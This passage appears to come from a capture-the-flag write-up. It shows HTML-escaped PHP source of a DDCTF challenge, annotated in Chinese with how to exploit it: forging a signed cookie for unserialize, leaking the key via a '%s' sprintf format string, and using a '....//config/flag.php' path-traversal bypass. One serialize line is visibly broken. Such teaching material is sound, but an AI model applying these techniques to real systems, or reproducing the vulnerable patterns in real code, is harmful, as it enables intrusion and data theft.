+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; __destruct() {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;empty&lt;/span&gt;($this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;path&lt;/span&gt;)) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#66d9ef&#34;&gt;exit&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      $path &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;sanitizepath&lt;/span&gt;($this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;path&lt;/span&gt;);&lt;span style=&#34;color:#75715e&#34;&gt;// ....//config/flag.php
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;      &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;strlen&lt;/span&gt;($path) &lt;span style=&#34;color:#f92672&#34;&gt;!==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;) {&lt;span style=&#34;color:#75715e&#34;&gt;//../config/flag.php
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;          &lt;span style=&#34;color:#66d9ef&#34;&gt;exit&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      $this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;response&lt;/span&gt;($data&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;file_get_contents&lt;/span&gt;($path),&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Congratulations&amp;#39;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;exit&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;?php
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;include &amp;#39;Application.php&amp;#39;;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;class Session extends Application {
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;  //key建议为8位字符串
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;  var $eancrykey                  = &amp;#39;&amp;#39;;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;  var $cookie_expiration			= 7200;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;  var $cookie_name                = &amp;#39;ddctf_id&amp;#39;;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;  var $cookie_path				= &amp;#39;&amp;#39;;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;  var $cookie_domain				= &amp;#39;&amp;#39;;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;  var $cookie_secure				= FALSE;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;  var $activity                   = &amp;#34;DiDiCTF&amp;#34;;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;  public function index()
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;  {
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;	if(parent::auth()) {
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;          $this-&amp;gt;get_key();
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;          if($this-&amp;gt;session_read()) {
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;              $data = &amp;#39;DiDI Welcome you %s&amp;#39;;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;              $data = sprintf($data,$_SERVER[&amp;#39;HTTP_USER_AGENT&amp;#39;]);
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;              parent::response($data,&amp;#39;sucess&amp;#39;);
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;          }else{
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;              $this-&amp;gt;session_create();
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;              $data = &amp;#39;DiDI Welcome you&amp;#39;;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;              parent::response($data,&amp;#39;sucess&amp;#39;);
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;          }
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;      }
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;  }
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;  private function get_key() {
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;      //eancrykey  and flag under the folder
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;      $this-&amp;gt;eancrykey =  file_get_contents(&amp;#39;../config/key.txt&amp;#39;);
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;  }
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;  public function session_read() {//target1: 绕过所有false
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;      if(empty($_COOKIE)) {
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;           return FALSE;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;      }//cookie not empty
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;      $session = $_COOKIE[$this-&amp;gt;cookie_name];
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;      if(!isset($session)) {
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;          parent::response(&amp;#34;session not found&amp;#34;,&amp;#39;error&amp;#39;);
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;          return FALSE;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;      }//ddctf_id 不能为空
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;      $hash = substr($session,strlen($session)-32);//长度要大于32? 32位之后的内容
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;      $session = substr($session,0,strlen($session)-32);//一直截断到倒数第32位
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;      if($hash !== md5($this-&amp;gt;eancrykey.$session)) {//key.txt 内容和 ddctf_id 内容片段拼接 再md5 等于ddctf_id32位之后的内容
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;          parent::response(&amp;#34;the cookie data not match&amp;#34;,&amp;#39;error&amp;#39;);
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;          return FALSE;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;      }
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;      $session = unserialize($session);//ddctf_id 反序列化
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;      if(!is_array($session) OR !isset($session[&amp;#39;session_id&amp;#39;]) OR !isset($session[&amp;#39;ip_address&amp;#39;]) OR !isset($session[&amp;#39;user_agent&amp;#39;])){
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;          return FALSE;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;      }//ddctf_id 反序列化之后的内容要有 session_id ip_address user_agent 再来个path??
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;      if(!empty($_POST[&amp;#34;nickname&amp;#34;])) {
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;          $arr = array($_POST[&amp;#34;nickname&amp;#34;],$this-&amp;gt;eancrykey);
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;          $data = &amp;#34;Welcome my friend %s&amp;#34;;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;          foreach ($arr as $k =&amp;gt; $v) {
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;              $data = sprintf($data,$v);
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;          }
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;          parent::response($data,&amp;#34;Welcome&amp;#34;);
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;      }//sprint格式化打印函数利用，通过传递进参数nickname = %S 让它可以读取key。
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;      if($session[&amp;#39;ip_address&amp;#39;] != $_SERVER[&amp;#39;REMOTE_ADDR&amp;#39;]) {
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;          parent::response(&amp;#39;the ip addree not match&amp;#39;.&amp;#39;error&amp;#39;);
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;          return FALSE;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;      }//ip_address 要写自己的ip
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;      if($session[&amp;#39;user_agent&amp;#39;] != $_SERVER[&amp;#39;HTTP_USER_AGENT&amp;#39;]) {
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;          parent::response(&amp;#39;the user agent not match&amp;#39;,&amp;#39;error&amp;#39;);
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;          return FALSE;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;      }//user_agent 内容要和 http_user_agent的匹配
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;      return TRUE;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;  }//看起来可以动手脚的只有session_id?
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;  private function session_create() {
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;      $sessionid = &amp;#39;&amp;#39;;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;      while(strlen($sessionid) &amp;lt; 32) {
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;          $sessionid .= mt_rand(0,mt_getrandmax());
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;      }
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;      $userdata = array(
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;          &amp;#39;session_id&amp;#39; =&amp;gt; md5(uniqid($sessionid,TRUE)),
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;          &amp;#39;ip_address&amp;#39; =&amp;gt; $_SERVER[&amp;#39;REMOTE_ADDR&amp;#39;],
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;          &amp;#39;user_agent&amp;#39; =&amp;gt; $_SERVER[&amp;#39;HTTP_USER_AGENT&amp;#39;],
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;          &amp;#39;user_data&amp;#39; =&amp;gt; &amp;#39;&amp;#39;,
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;      );
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;      $cookiedata = serialize($
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;  );
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;      $cookiedata = $cookiedata.md5($this-&amp;gt;eancrykey.$cookiedata);
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;      $expire = $this-&amp;gt;cookie_expiration + time();
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;      setcookie(
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;          $this-&amp;gt;cookie_name,
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;          $cookiedata,
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;          $expire,
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;          $this-&amp;gt;cookie_path,
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;          $this-&amp;gt;cookie_domain,
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;          $this-&amp;gt;cookie_secure
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;          );
